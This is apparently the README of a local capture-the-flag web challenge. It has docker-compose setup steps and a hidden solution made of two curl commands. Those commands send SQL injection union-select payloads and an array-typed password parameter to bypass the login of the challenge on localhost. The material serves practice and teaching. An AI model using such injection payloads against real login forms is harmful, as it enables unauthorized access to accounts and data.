# Klaus is blind and has no sleep

# How to setup
sudo docker-compose up  
Open your Browser: http://localhost:8080/?src to get the source code of the challenge  
(if you change something and want to recreate the container: sudo docker-compose build --force-rm ) 

# Why Klaus?
I don't know  


<details><summary>Solution</summary>
<p>

```bash
curl localhost:8080/index.php -d 'password[]' -d "username=-1' union select 1,NULL-- -" 
curl localhost:8080/index.php -d 'password=test123' -d "username=-1' union select 1,'7288edd0fc3ffcbe93a0cf06e3568e28521687bc'-- -"
```
</p>
</details>

